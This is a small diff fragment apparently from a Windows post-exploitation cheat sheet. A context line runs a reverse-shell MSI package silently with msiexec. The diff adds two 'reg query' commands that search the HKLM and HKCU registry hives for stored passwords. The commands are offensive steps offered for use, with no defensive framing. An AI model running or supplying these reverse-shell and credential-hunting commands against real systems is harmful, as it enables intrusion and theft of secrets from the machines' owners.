@@ -56,8 +56,8 @@ CREATE REVERSE MSI FILE.
 RUN MSI: msiexec /quiet /qn /i /reverseshell.msi
 
 #################################### PASSWORDS #####################################################
-
-
+reg query HKLM /f password /t REG_SZ /s = local machine
+reg query HKCU /f password /t REG_SZ /s = local user
 
 
 
